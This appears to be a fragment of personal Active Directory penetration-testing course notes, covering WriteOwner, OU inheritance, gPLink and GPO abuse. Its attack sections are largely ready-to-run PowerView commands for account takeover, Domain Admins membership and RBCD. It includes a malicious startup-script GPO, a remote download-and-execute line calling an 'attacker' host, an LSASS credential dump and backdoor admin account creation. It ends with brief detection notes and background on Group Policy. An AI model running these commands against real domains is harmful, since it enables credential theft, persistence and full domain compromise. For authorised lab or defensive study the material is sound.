+Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
+</code></pre>
+<p><strong>Step 2 — Grant yourself full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<p><strong>Step 3 — Abuse based on object type</strong></p>
+<h4 id="writeowner-on-user">🧩 3. WriteOwner on USER</h4>
+<p><strong>📌 What you get</strong></p>
+<p>After abuse:</p>
+<ul>
+<li><p>Reset password</p></li>
+<li><p>Add SPN (Kerberoasting)</p></li>
+<li><p>Shadow credentials</p></li>
+<li><p>Account takeover</p></li>
+</ul>
+<h4 id="example-attack"><strong>⚔️ Example Attack</strong></h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre><code>
+Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
+</code></pre>
+<p><strong>Step 2 — Full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<p><strong>Step 3 — Reset password</strong></p>
+<pre><code>
+Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString &quot;P@ss123!&quot; -AsPlainText-Force)
+</code></pre>
+<h4 id="result-1">🎯 Result</h4>
+<p>👉 Full account takeover</p>
+<p><strong>✅ Conditions</strong></p>
+<ul>
+<li><p>WriteOwner on user</p></li>
+<li><p>Target not protected (or still modifiable)</p></li>
+<li><p>You can reach DC</p></li>
+</ul>
+<h4 id="writeowner-on-computer">💻 4. WriteOwner on COMPUTER</h4>
+<p><strong>📌 What you get</strong></p>
+<p>After abuse:</p>
+<ul>
+<li><p>Modify attributes</p></li>
+<li><p>Set delegation (RBCD)</p></li>
+<li><p>Control machine account</p></li>
+</ul>
+<h4 id="example-attack-rbcd-path">⚔️ Example Attack (RBCD path)</h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre><code>
+Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
+</code></pre>
+<p><strong>Step 2 — Full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity TARGET$ -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<p><strong>Step 3 — Set RBCD</strong></p>
+<pre><code>
+Set-DomainObject-IdentityTARGET$-Set @{&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;=$attackerSID}
+</code></pre>
+<p><strong>🎯 Result</strong></p>
+<p>👉 SYSTEM access on target machine</p>
+<p><strong>✅ Conditions</strong></p>
+<ul>
+<li><p>WriteOwner on computer</p></li>
+<li><p>Ability to create/control attacker machine (SPN)</p></li>
+<li><p>Kerberos abuse possible</p></li>
+</ul>
+<h4 id="writeowner-on-group">👥 5. WriteOwner on GROUP</h4>
+<p><strong>📌 What you get</strong></p>
+<ul>
+<li><p>Add members to group</p></li>
+<li><p>Full control over group</p></li>
+</ul>
+<h4 id="example-attack-1">⚔️ Example Attack</h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre><code>
+Set-DomainObjectOwner -Identity TARGET -OwnerIdentity attacker
+</code></pre>
+<p><strong>Step 2 — Full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl -TargetIdentity &quot;Domain Admins&quot; -PrincipalIdentity attacker -RightsAll
+</code></pre>
+<hr />
+<p><strong>Step 3 — Add yourself</strong></p>
+<pre><code>
+Add-DomainGroupMember -Identity &quot;Domain Admins&quot; -Members attacker
+</code></pre>
+<hr />
+<h4 id="result-2">🎯 Result</h4>
+<p>👉 Domain Admin access</p>
+<hr />
+<h4 id="note">⚠️ Note</h4>
+<ul>
+<li><p>High-value target</p></li>
+<li><p>Likely monitored</p></li>
+</ul>
+<hr />
+<h4 id="conditions"><strong>✅ Conditions</strong></h4>
+<ul>
+<li><p>WriteOwner on group</p></li>
+<li><p>Group not protected OR ACL still modifiable</p></li>
+</ul>
+<h4 id="writeowner-on-ou">🏢 6. WriteOwner on OU</h4>
+<p><strong>📌 What you get</strong></p>
+<ul>
+<li><p>Control over OU ACL</p></li>
+<li><p>Ability to push permissions to child objects</p></li>
+</ul>
+<h4 id="example-attack-2">⚔️ Example Attack</h4>
+<p><strong>Step 1 — Take ownership</strong></p>
+<pre><code>
+Set-DomainObjectOwner -Identity &quot;OU=IT,DC=domain,DC=local&quot;-OwnerIdentityattacker
+</code></pre>
+<p><strong>Step 2 — Full control</strong></p>
+<pre><code>
+Add-DomainObjectAcl-TargetIdentity&quot;OU=IT,DC=domain,DC=local&quot;-PrincipalIdentityattacker-RightsAll
+</code></pre>
+<p><strong>Step 3 — Push inherited control</strong></p>
+<pre><code>
+Add-DomainObjectAcl `
+
+-TargetIdentity&quot;OU=IT,DC=domain,DC=local&quot; `
+
+-PrincipalIdentityattacker `
+
+-RightsAll `
+
+-InheritanceTypeDescendents `
+
+-TargetTypeUser
+</code></pre>
+<hr />
+<p><strong>🎯 Result</strong></p>
+<p>👉 Control over:</p>
+<ul>
+<li><p>Users</p></li>
+<li><p>Computers inside OU</p></li>
+</ul>
+<hr />
+<p><strong>💥 Follow-up attacks</strong></p>
+<ul>
+<li><p>Reset passwords</p></li>
+<li><p>RBCD on computers</p></li>
+<li><p>Group abuse</p></li>
+</ul>
+<hr />
+<p><strong>✅ Conditions</strong></p>
+<ul>
+<li><p>WriteOwner on OU</p></li>
+<li><p>Inheritance enabled on child objects</p></li>
+</ul>
+<hr />
+<h4 id="summary-table-2">🔥 7. Summary Table</h4>
+<div class="line-block">Target | What you gain | Final impact |</div>
+<div class="line-block">— | — | — |</div>
+<div class="line-block">User | Full control | Account takeover |</div>
+<div class="line-block">Computer | Delegation control | SYSTEM access |</div>
+<div class="line-block">Group | Membership control | Privilege escalation |</div>
+<div class="line-block">OU | Control over children | Mass compromise |</div>
+<hr />
+<h4 id="key-differences-vs-genericall">🧠 8. Key Differences vs GenericAll</h4>
+<div class="line-block">Right | Capability |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">GenericAll | Direct full control |</div>
+<div class="line-block">WriteOwner | Indirect → must escalate via ACL |</div>
+<hr />
+<h4 id="one-line-takeaway">🧠 9. One-line Takeaway</h4>
+<p>👉 <strong>WriteOwner is a privilege escalation primitive — not direct control, but a stepping stone to full compromise.</strong></p>
+<h2 id="ou-abuse">OU Abuse</h2>
+<pre class="python"><code>
+INHERITANCE CHAIN:
+
+┌──────────────────────────────────────────────────────────────┐
+
+│ EXPLICIT PERMISSIONS ON OU                                  │
+
+│ (What you directly assign to OU)                            │
+
+└──────────────────┬───────────────────────────────────────────┘
+
+                   │
+
+                   ├─ Apply to OU itself
+
+                   │
+
+                   ├─ INHERIT DOWN (unless blocked)
+
+                   │     ├─ Child OUs
+
+                   │     ├─ Computers
+
+                   │     ├─ Users
+
+                   │     ├─ Groups
+
+                   │     └─ Other objects
+
+                   │
+
+                   └─ Inheritance Type:
+
+                       ├─ &quot;This object and all descendant objects&quot;
+
+                       │   (DEFAULT - most permissive)
+
+                       │
+
+                       ├─ &quot;This object only&quot;
+
+                       │   (NO inheritance)
+
+                       │
+
+                       └─ &quot;All descendant objects&quot;
+
+                           (Child objects only, not OU itself)
+</code></pre>
+<p><strong>Key Rule:</strong> Unless an OU has “<strong>Protect from inheritance</strong>” enabled, ALL permissions granted on parent OU flow down to children automatically.</p>
+<h3 id="generic-rights"><strong>GENERIC RIGHTS</strong></h3>
+<h4 id="a.-genericall-full-control"><strong>1A. GenericAll (Full Control)</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: All operations on the OU object itself
+
+- Read all properties
+
+- Modify all properties
+
+- Delete the OU
+
+- Change permissions
+
+- Change owner
+
+- Create child objects
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - ALL children inherit GenericAll
+
+  ├─ Computers  → Can reset passwords, modify all properties
+
+  ├─ Users      → Can reset passwords, modify all properties
+
+  ├─ Groups     → Can modify membership, properties
+
+  └─ Child OUs  → Full control of child OUs recursively
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ All users in OU and child OUs</p></li>
+<li><p>✓ All computers in OU and child OUs</p></li>
+<li><p>✓ All groups in OU and child OUs</p></li>
+<li><p>✓ All child OUs (recursively)</p></li>
+</ul>
+<h4 id="b.-genericread"><strong>1B. GenericRead</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Read all properties on OU
+
+- Cannot modify
+
+- Cannot delete
+
+- Cannot create
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - Children inherit read rights
+
+  ├─ Can read all properties of users/computers/groups
+
+  ├─ Can enumerate OU contents
+
+  └─ Cannot modify anything
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ Can read all user properties</p></li>
+<li><p>✓ Can read all computer properties</p></li>
+<li><p>✓ Can read all group properties</p></li>
+<li><p>✓ Can enumerate memberships</p></li>
+</ul>
+<h4 id="property-specific-write-rights"><strong>2. PROPERTY-SPECIFIC WRITE RIGHTS</strong></h4>
+<h4 id="a.-genericwrite"><strong>2A. GenericWrite</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Write all non-schema properties
+
+- Modify all non-system attributes
+
+- Cannot reset passwords directly
+
+- Cannot modify permissions (needs WriteDacl)
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - ALL children inherit GenericWrite
+
+  ├─ Users → Modify scriptPath, homeDirectory, etc.
+
+  ├─ Computers → Modify delegated rights, DNS names
+
+  ├─ Groups → Modify descriptions, managedBy
+
+  └─ Child OUs → Modify properties
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ All users in OU</p></li>
+<li><p>✓ All computers in OU</p></li>
+<li><p>✓ All groups in OU</p></li>
+<li><p>✓ All child OUs</p></li>
+</ul>
+<h4 id="b.-writeproperty-specific-attribute"><strong>2B. WriteProperty (Specific Attribute)</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Write to specific attributes only (e.g., mail, telephone)
+
+- Very granular permission
+
+- Inheritance depends on what property
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - Inheritance applies to the specific property
+
+  ├─ Can write that property on all children
+
+  ├─ Cannot write other properties
+
+  └─ If property is &quot;scriptPath&quot; → RCE
+</code></pre>
+<h3 id="deferential-rights-change-control-ownership"><strong>3. DEFERENTIAL RIGHTS (Change Control &amp; Ownership)</strong></h3>
+<hr />
+<h4 id="a.-writedacl-modify-permissions"><strong>3A. WriteDacl (Modify Permissions)</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Modify the ACL on the OU
+
+- Add/remove permissions
+
+- Grant yourself Full Control
+
+- Grant others permissions
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - Can modify ACLs on all children
+
+  ├─ Users → Grant yourself Reset Password right
+
+  ├─ Computers → Grant yourself Full Control
+
+  ├─ Groups → Grant yourself modify right
+
+  └─ Child OUs → Modify their ACLs recursively
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ All users (grant yourself reset password)</p></li>
+<li><p>✓ All computers (grant yourself full control)</p></li>
+<li><p>✓ All groups (grant yourself modify membership)</p></li>
+<li><p>✓ All child OUs (recursive ACL modification)</p></li>
+</ul>
+<h4 id="b.-writeowner-change-owner"><strong>3B. WriteOwner (Change Owner)</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Change the owner of the OU
+
+- Owner has implicit Full Control
+
+- Change owner to yourself → Full Control
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - Can change owner of all children
+
+  ├─ Users → Become owner → Full Control
+
+  ├─ Computers → Become owner → Full Control
+
+  ├─ Groups → Become owner → Full Control
+
+  └─ Child OUs → Become owner → Full Control recursively
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ All users in OU</p></li>
+<li><p>✓ All computers in OU</p></li>
+<li><p>✓ All groups in OU</p></li>
+<li><p>✓ All child OUs</p></li>
+</ul>
+<h3 id="object-creation-deletion-rights"><strong>4. OBJECT CREATION &amp; DELETION RIGHTS</strong></h3>
+<hr />
+<h4 id="a.-createchild"><strong>4A. CreateChild</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Create child objects in the OU
+
+- Can create users, computers, groups
+
+- Cannot modify existing objects
+</code></pre>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES (in a specific way) - Can create children inside child OUs
+
+  ├─ OU level: Can create objects in this OU
+
+  ├─ Child OUs: Can create objects inside child OUs
+
+  └─ Inheritance type: &quot;This object and all descendant objects&quot;
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ Can create anywhere in OU and child OUs</p></li>
+<li><p>✓ Creates can be given arbitrary properties/memberships</p></li>
+<li><p>✓ No restrictions on what you create</p></li>
+</ul>
+<h3 id="extended-rights-special-capabilities"><strong>5. EXTENDED RIGHTS (Special Capabilities)</strong></h3>
+<hr />
+<h4 id="a.-extendedright---reset-password"><strong>5A. ExtendedRight - Reset Password</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Reset passwords for all users in OU
+
+- Can set new password
+
+- User doesn&#39;t need to know old password
+
+- Requires explicit Extended Right GUID
+</code></pre>
+<p><strong>GUID:</strong> 00299570-246d-11d0-a768-00aa006e0529</p>
+<p><strong>Inheritance to Child Objects:</strong></p>
+<pre class="python"><code>
+✓ YES - Can reset passwords on all children
+
+  ├─ Users in OU → Password reset
+
+  ├─ Users in child OUs → Password reset
+
+  └─ Non-inherited: Doesn&#39;t apply to computers/groups
+</code></pre>
+<p><strong>Affected Objects:</strong></p>
+<ul>
+<li><p>✓ All users in OU and child OUs</p></li>
+<li><p>✗ Does NOT affect computers or groups directly</p></li>
+</ul>
+<h4 id="b.-extendedright---force-change-password"><strong>5B. ExtendedRight - Force Change Password</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Force user to change password at next logon
+
+- User can&#39;t use account until password changed
+
+- Attacker doesn&#39;t know the new password
+
+- Used for DoS or forcing re-authentication
+</code></pre>
+<p><strong>GUID:</strong> 00299570-246d-11d0-a768-00aa006e0529 (combined with Reset)</p>
+<h4 id="c.-extendedright---sendto"><strong>5C. ExtendedRight - SendTo</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Send messages to the object (Exchange-related)
+
+- Rarely used in pure AD
+
+- More relevant in Exchange environments
+</code></pre>
+<h4 id="d.-extendedright---addremove-self-as-member"><strong>5D. ExtendedRight - Add/Remove Self as Member</strong></h4>
+<p><strong>OU-Level Permission:</strong></p>
+<pre class="python"><code>
+Grants: Add yourself to groups in OU
+
+- Can self-add to any group
+</code></pre>
+<h2 id="genericall-write-on-ou">GenericAll / Write on OU</h2>
+<h3 id="what-genericwrite-on-ou-actually-means">🧠 1. What GenericWrite on OU Actually Means</h3>
+<p><strong>🔐 GenericWrite = Attribute-level control</strong></p>
+<ul>
+<li><p>You <strong>cannot fully control the OU</strong></p></li>
+<li><p>But you can <strong>modify specific attributes</strong> of the OU</p></li>
+</ul>
+<p>👉 One critical attribute:</p>
+<p>gPLink</p>
+<pre class="python"><code>
+GPO
+
+├── GPC (AD Object)
+
+└── GPT (SYSVOL Files)
+</code></pre>
+<h3 id="what-is-gplink">🧠 2. What is gPLink?</h3>
+<p><strong>📌 Definition</strong></p>
+<blockquote>
+<p><strong>gPLink = attribute that defines which GPOs are linked to an OU</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<ul>
+<li><p>OU doesn’t directly enforce policies</p></li>
+<li><p>It <strong>links to GPOs</strong>, and those GPOs apply to:</p>
+<ul>
+<li>Users inside OU</li>
+<li>Computers inside OU</li>
+</ul></li>
+</ul>
+<p><strong>🧠 Mental Model</strong></p>
+<pre><code>
+OU → (gPLink) → GPO → Applies to → Users &amp; Computers
+</code></pre>
+<p>👉 So if you control <strong>gPLink</strong>, you control <strong>what policies apply</strong></p>
+<h3 id="why-genericwrite-on-ou-is-dangerous">🔥 3. Why GenericWrite on OU is Dangerous</h3>
+<p>Even without full control:</p>
+<p>👉 If you can modify <code>gPLink</code></p>
+<p>→ You can attach a <strong>malicious GPO</strong></p>
+<p>→ That GPO executes actions on all child objects</p>
+<h3 id="scenario-genericwrite-on-ou-gplink-abuse">💻 🧪 Scenario: GenericWrite on OU → gPLink Abuse</h3>
+<p><strong>🎯 Lab Setup</strong></p>
+<ul>
+<li><p>Attacker user: <code>attacker</code></p></li>
+<li><p>Target OU: <code>OU=IT,DC=domain,DC=local</code></p></li>
+<li><p>Inside OU:</p>
+<ul>
+<li>Users: <code>john</code>, <code>admin1</code></li>
+<li>Computers: <code>IT-PC01</code></li>
+</ul></li>
+</ul>
+<p>👉 You have:</p>
+<pre><code>
+GenericWrite → OU=IT
+</code></pre>
+<p><strong>🧠 Attack Goal</strong></p>
+<pre><code>
+Abuse gPLink → Link malicious GPO → Execute code on all OU machines
+</code></pre>
+<h3 id="step-1-verify-access-bloodhound-powerview">⚔️ Step 1: Verify Access (BloodHound / PowerView)</h3>
+<p><strong>PowerView check:</strong></p>
+<pre><code>
+Get-ObjectAcl -Identity &quot;OU=IT,DC=domain,DC=local&quot; -ResolveGUIDs
+</code></pre>
+<p><strong>🔍 Output (snippet):</strong></p>
+<pre><code>
+IdentityReference : DOMAIN\attacker
+
+ActiveDirectoryRights : GenericWrite
+
+ObjectDN : OU=IT,DC=domain,DC=local
+</code></pre>
+<p>✅ Confirms you can modify OU attributes (including <code>gPLink</code>)</p>
+<h3 id="step-2-create-malicious-gpo">⚔️ Step 2: Create Malicious GPO</h3>
+<pre><code>
+New-GPO -Name &quot;evilGPO&quot;
+</code></pre>
+<p><strong>✔ Output:</strong></p>
+<pre><code>
+DisplayName      : evilGPO
+
+Id               : 6f3c1b44-9d8e-4b1c-92c2-123456789abc
+
+GpoStatus        : AllSettingsEnabled
+</code></pre>
+<hr />
+<h3 id="step-3-modify-gpo-to-execute-payload">⚔️ Step 3: Modify GPO to Execute Payload</h3>
+<p><strong>Example: Add startup script</strong></p>
+<pre><code>
+Set -GPStartupScript -Name &quot;evilGPO&quot; -ScriptName &quot;shell.bat&quot; -ScriptParameters&quot;&quot;
+</code></pre>
+<p><strong>Example payload (<code>shell.bat</code>)</strong></p>
+<pre><code>
+net localgroup administrators attacker /add
+</code></pre>
+<p>👉 Effect:</p>
+<ul>
+<li>Any machine in OU → attacker becomes <strong>local admin</strong></li>
+</ul>
+<h3 id="step-4-link-gpo-to-ou-gplink-abuse">⚔️ Step 4: Link GPO to OU (gPLink Abuse)</h3>
+<pre><code>
+New-GPLink -Name &quot;evilGPO&quot; -Target &quot;OU=IT,DC=domain,DC=local&quot;
+</code></pre>
+<p><strong>🔍 What happens internally:</strong></p>
+<pre><code>
+gPLink attribute updated:
+
+[LDAP://CN={GPO-GUID},CN=Policies,CN=System,...]
+</code></pre>
+<h3 id="step-5-wait-for-policy-application">⚔️ Step 5: Wait for Policy Application</h3>
+<p><strong>Force update (if you have access):</strong></p>
+<pre><code>
+gpupdate/force
+</code></pre>
+<p><strong>🖥️ On victim machine:</strong></p>
+<pre><code>
+whoami /groups
+</code></pre>
+<p><strong>✔ Output:</strong></p>
+<pre><code>
+BUILTIN\Administrators
+
+DOMAIN\attacker
+</code></pre>
+<p>🔥 You are now <strong>local admin on all machines in OU</strong></p>
+<h3 id="alternate-payloads">💥 Alternate Payloads</h3>
+<p><strong>🎯 1. Reverse Shell</strong></p>
+<pre><code>
+powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://attacker/shell.ps1&#39;)&quot;
+</code></pre>
+<p><strong>🎯 2. Dump Credentials</strong></p>
+<pre><code>
+rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump &lt;lsass_pid&gt; C:\temp\lsass.dmp full
+</code></pre>
+<p><strong>🎯 3. Persistence</strong></p>
+<pre><code>
+net user backdoor Pass@123 /add
+
+net localgroup administrators backdoor /add
+</code></pre>
+<h3 id="step-6-domain-escalation-path">🔄 Step 6: Domain Escalation Path</h3>
+<p>Once you get local admin:</p>
+<pre><code>
+Local Admin → Dump creds → Lateral movement → Domain Admin
+</code></pre>
+<h3 id="real-attack-chain">🧠 Real Attack Chain</h3>
+<pre><code>
+GenericWrite (OU)
+
+    ↓
+
+Modify gPLink
+
+    ↓
+
+Link malicious GPO
+
+    ↓
+
+Code execution on machines
+
+    ↓
+
+Local admin access
+
+    ↓
+
+Credential dump
+
+    ↓
+
+Domain compromise
+</code></pre>
+<hr />
+<h3 id="detection-example">🚨 Detection Example</h3>
+<h4 id="event-id-5136-directory-change">🔍 Event ID 5136 (Directory Change)</h4>
+<pre><code>
+Attribute Modified: gPLink
+
+Object: OU=IT,DC=domain,DC=local
+</code></pre>
+<h4 id="gpo-link-event">🔍 GPO Link Event</h4>
+<pre><code>
+New GPO linked: evilGPO
+
+Target: OU=IT
+</code></pre>
+<h4 id="endpoint-alert">🔍 Endpoint Alert</h4>
+<ul>
+<li>Multiple machines executing:</li>
+</ul>
+<pre><code>
+net localgroup administrators attacker /add
+</code></pre>
+<hr />
+<h3 id="key-takeaway-2">🧠 Key Takeaway</h3>
+<pre><code>
+You didn’t exploit machines directly.
+
+You modified policy →
+
+Policy executed for you →
+
+Machines compromised themselves.
+</code></pre>
+<hr />
+<h3 id="clean-one-liner">🔥 Clean One-Liner</h3>
+<blockquote>
+<p><strong>GenericWrite on OU → control gPLink → push malicious GPO → mass compromise</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h2 id="gpo-abuse">GPO Abuse</h2>
+<h3 id="understanding-the-core-concept">Understanding The Core Concept</h3>
+<h4 id="group-policy-in-active-directory-ad">🔐 <strong>Group Policy in Active Directory (AD)</strong></h4>
+<p>In a Windows domain environment, <strong>Group Policy</strong> is a framework for <strong>centralized management and configuration</strong> of operating systems, applications, and user settings.</p>
+<p>Instead of having to manually configure each machine or user account, you define settings once, and AD pushes them out automatically.</p>
+<p>Think of it like a <strong>remote control panel</strong> for every domain-joined computer and user in your organization.</p>
+<hr />
+<h4 id="scope-of-group-policy"><strong>2. Scope of Group Policy</strong></h4>
+<p>Group Policy settings <strong>apply either to computers or to users</strong> — but not both at the same time for a single policy setting.</p>
+<div class="line-block"><strong>Target</strong> | <strong>Examples of Settings</strong> |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block"><strong>Computers</strong> | Security settings (e.g., disable USB, enforce firewall rules), startup/shutdown scripts, software installation, registry changes. |</div>
+<div class="line-block"><strong>Users</strong> | Password complexity, logon/logoff scripts, drive mappings, desktop background, access to Control Panel. |</div>
+<blockquote>
+<p>📌 When a computer starts up, computer policies apply.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p>When a user logs in, <strong>user policies</strong> apply.</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<h4 id="what-is-a-gpo-group-policy-object"><strong>3. What is a GPO (Group Policy Object)?</strong></h4>
+<p>A <strong>GPO</strong> is the <strong>container</strong> for all these policy settings.</p>
+<p><strong>GPO</strong> stands for <strong>Group Policy Object</strong>.</p>
+<p>It’s a <strong>set of rules and configurations</strong> in Active Directory that control how <strong>users and computers</strong> behave in a Windows domain.</p>
+<p>Think of it like a <strong>file that holds a bunch of rules</strong>.</p>
+<p><strong>Example:</strong></p>
+<ul>
+<li>A GPO named <strong>“Password Policy”</strong> might include:
+<ul>
+<li>Minimum password length = 12</li>
+<li>Password must include numbers and symbols</li>
+</ul></li>
+</ul>
+<h4 id="where-gpos-live"><strong>Where GPOs Live:</strong></h4>
+<ul>
+<li><strong>Two parts</strong>:
+<ol type="1">
+<li><strong>Group Policy Container (GPC)</strong> — stored in <strong>Active Directory</strong>
+<ul>
+<li>Holds metadata: version numbers, GPO links, security filtering.</li>
+</ul></li>
+<li><strong>Group Policy Template (GPT)</strong> — stored in <strong>SYSVOL</strong> (shared folder on Domain Controllers)
+<ul>
+<li>Holds the actual settings files: registry.pol, scripts, ADM templates, etc.</li>
+</ul></li>
+</ol></li>
+</ul>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<p>In above image <strong>APPLOCKER</strong> is the GPO</p>
+<h4 id="what-can-a-gpo-do"><strong>What Can a GPO Do?</strong></h4>
+<ul>
+<li><p>Configure security policies (e.g., password length, lockout time).</p></li>
+<li><p>Deploy software automatically.</p></li>
+<li><p>Run scripts on logon/logoff/startup/shutdown.</p></li>
+<li><p>Restrict access to system tools.</p></li>
+<li><p>Configure firewall, RDP, and service settings.</p></li>
+</ul>
+<p><strong>Inshort:</strong></p>
+<blockquote>
+<p><strong>Group Policy = the concept (rules)</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<p><strong>GPO = the object (container holding those rules)</strong></p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<hr />
+<h4 id="linking-gpos"><strong>4. Linking GPOs</strong></h4>
+<p>You can <strong>link a GPO</strong> to three main AD container levels:</p>
+<ol type="1">
+<li><p><strong>Domain</strong> — affects <em>all</em> users/computers in the domain.</p></li>
+<li><p><strong>Site</strong> — affects all users/computers in a physical site.</p></li>
+<li><p><strong>Organizational Unit (OU)</strong> — affects only those in that OU (and sub-OUs).</p></li>
+</ol>
+<blockquote>
+<p>Example:</p>
+</blockquote>
+<blockquote>
+
+</blockquote>
+<blockquote>
+<ul>
+<li>If you link a GPO to <code>Sales OU</code>, only the Sales department users/computers get those policies.</li>
+</ul>
+</blockquote>
+<hr />
+<h4 id="organizational-units-ous"><strong>5. Organizational Units (OUs)</strong></h4>
+<ul>
+<li><p>OUs (Organizational Units) are containers within a domain used to <strong>organize users, computers, and groups</strong>.</p></li>
+<li><p>An <strong>OU</strong> is the <strong>lowest-level container</strong> where you can apply GPOs.</p></li>
+<li><p>They are also used for <strong>delegating administration</strong> — you can allow certain IT staff to manage only a specific OU (e.g., only “HR Department” computers).</p></li>
+<li><p>This helps split responsibilities and prevent one admin from having full domain control.</p></li>
+</ul>
+<p>Note:- all student user account are in the <strong>default “Users” container</strong> of the <code>DOLLARCORP.MONEYCORP.LOCAL</code> domain, <strong>not in an Organizational Unit (OU)</strong>.</p>
+<p><strong>You only get GPOs that are linked to the domain or site. OU-specific policies won’t affect you because you are in the default Users container and you are not part of any OU.</strong></p>
+<figure>
+
+<figcaption aria-hidden="true">image.png</figcaption>
+</figure>
+<hr />
+<h4 id="security-implications-why-gpos-matter-in-attacks"><strong>6. Security Implications — Why GPOs Matter in Attacks</strong></h4>
+<p><strong>Legit use</strong>: They centralize management — admins can roll out changes to hundreds or thousands of machines in seconds.</p>
+<p>Misconfigured GPOs are a <strong>goldmine for attackers</strong> because:</p>
+<ul>
+<li><p>If a user can modify a GPO linked to systems they don’t own → they can push malicious settings.</p></li>
+<li><p>GPOs can run scripts automatically → an attacker can drop a <strong>startup script</strong> to execute malware on many systems at once.</p></li>
+<li><p>Attackers can <strong>modify security settings</strong> (e.g., add themselves to “Local Administrators” group) through GPO.</p></li>
+<li><p>They can be used for <strong>persistence</strong> (stay hidden even after account resets).</p></li>
+</ul>
+<h3 id="common-attack-scenarios">Common Attack Scenarios</h3>
+<div class="line-block"><strong>Misconfiguration</strong> | <strong>Potential Abuse</strong> |</div>
+<div class="line-block">— | — |</div>
+<div class="line-block">GPO linked to critical servers but editable by low-privileged users | Privilege escalation (attacker becomes admin on target machines) |</div>
+<div class="line-block">OU-level GPO with weak permissions | Attackers take control of that department’s systems |</div>
+<div class="line-block">Scripts stored in GPO not signed or secured | Inject malicious code to run on every affected machine |</div>
+<p>💡<strong>In short:</strong></p>
+<p>GPOs are <strong>Active Directory’s remote control</strong> for configuring and enforcing policies on domain-joined systems. Great for admins, terrifying when misused.</p>
+<hr />
+<p>✅ <strong>In short:</strong></p>
+<ul>
+<li><p><strong>Group Policy</strong> = Centralized configuration system for AD environments.</p></li>
+<li><p><strong>GPO</strong> = A package of policy settings, permissions, and scope.</p></li>
+<li><p><strong>OU</strong> = The smallest AD container for applying GPOs and delegating admin rights.</p></li>
+<li><p><strong>Security risk</strong> = If permissions are too open, GPOs can be abused for privesc, persistence, and mass compromise.</p></li>
+</ul>
+<hr />
+<h4 id="how-group-policy-works">🏗️ <strong>How Group Policy Works</strong></h4>
+<ul>
+<li><p><strong>Admins create/edit GPOs</strong> (Group Policy Objects) using <strong>Group Policy Management Console (GPMC)</strong>.</p></li>
+<li><p><strong>Edit the GPO</strong> and configure desired settings (user policies, computer policies).</p></li>
+<li><p><strong>Link/apply the GPO</strong> to a <strong>site</strong>, <strong>domain</strong>, or <strong>OU</strong> (Organizational Units) where the target users/computers reside.</p></li>
+<li><p>The <strong>Group Policy Client</strong> on each computer <strong>downloads and applies</strong> the policies periodically (every 90 minutes by default).</p></li>
+<li><p>You can force it using <code>gpupdate /force</code>.</p></li>
+</ul>
+<p><strong>Real-World Use Case in AD Environment</strong></p>
+<ul>
+<li><p>Company wants to enforce <strong>password complexity</strong> → set it in a <strong>domain GPO</strong>.</p></li>
+<li><p>Disable access to <strong>USB ports</strong> for all interns → apply a GPO to the <strong>“Interns OU”</strong>.</p></li>
